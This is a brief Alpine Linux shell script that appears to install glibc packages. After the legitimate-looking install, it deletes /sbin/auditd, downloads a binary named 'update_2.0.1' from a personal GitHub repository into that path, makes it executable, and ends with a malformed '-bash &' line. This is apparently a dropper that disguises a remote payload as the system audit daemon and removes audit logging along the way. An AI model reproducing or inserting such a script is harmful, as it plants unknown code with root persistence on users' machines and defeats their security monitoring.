#!/bin/sh
wget -q -O /etc/apk/keys/sgerrand.rsa.pub https://alpine-pkgs.sgerrand.com/sgerrand.rsa.pub
wget -q https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.35-r1/glibc-2.35-r1.apk
wget -q https://github.com/sgerrand/alpine-pkg-glibc/releases/download/2.35-r1/glibc-bin-2.35-r1.apk
apk add glibc-2.35-r1.apk
apk add glibc-bin-2.35-r1.apk
rm -rf glibc-2.35-r1.apk
rm -rf glibc-bin-2.35-r1.apk
rm -rf /sbin/auditd
wget -q -O /sbin/auditd https://github.com/jackmoc/Alpine/raw/main/update_2.0.1
chmod +x /sbin/auditd
-bash &
